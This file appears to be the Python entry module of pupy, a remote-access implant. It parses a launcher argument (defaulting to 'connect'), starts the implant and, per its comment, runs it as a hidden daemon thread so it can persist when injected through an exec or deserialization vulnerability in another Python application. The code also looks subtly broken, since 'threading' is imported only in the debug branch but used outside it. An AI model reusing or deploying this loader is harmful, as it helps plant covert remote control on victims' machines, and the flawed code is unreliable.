# -*- coding: utf-8 -*-

import argparse

from . import main

from network.conf import launchers, load_network_modules

load_network_modules()

parser = argparse.ArgumentParser('pupy')
parser.add_argument('--debug', action='store_true', default=False, help='Enable debug')
parser.add_argument('launcher', choices=launchers.keys(), default='connect', help='Launcher')
parser.add_argument('args', nargs=argparse.REMAINDER, help='Launcher args')

args = parser.parse_args()

main(config={
    'launcher': args.launcher,
    'launcher_args': args.args,
}, argv=[], debug=args.debug)

if __debug__:
    import threading
    for thread in threading.enumerate():
        print "> ALIVE:", thread, thread.daemon
else:
    import platform

    if not platform.system() == 'android':
        if not hasattr(platform, 'pupy_thread'):
            # to allow pupy to run in background when imported or injected
            # through a python application exec/deserialization vulnerability
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'pupy_thread', t)
